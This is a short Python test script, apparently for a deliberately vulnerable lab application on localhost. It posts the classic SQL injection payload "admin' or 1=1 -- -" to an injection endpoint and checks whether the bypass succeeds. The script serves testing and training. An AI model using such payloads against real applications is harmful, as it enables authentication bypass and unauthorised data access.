import requests 
import pytest

def test_classicsqlinjection(url, payload):
    data = {'sqli': payload}
    #print("[DEBUG] Sending: ", data)
    r = requests.post(url=url, data=data)

    #print(r.text)

    assert "Milkshak3s" in r.text
    assert 200 == r.status_code

def test_blindsqlinjection(url, payload):
    data = {'sqli': payload}
    #print("[DEBUG] Sending: ", data)
    r = requests.post(url=url, data=data)

    #print(r.text)

    assert "Milkshak3s" in r.text
    assert 200 == r.status_code

def main():
    url = "http://127.0.0.1:5000/api/v1/sqlinjection"

    test_classicsqlinjection(url, "admin' or 1=1 -- - ")
    test_blindsqlinjection(url, "admin' or 1=1 -- - ")

if __name__ == '__main__':
    main()
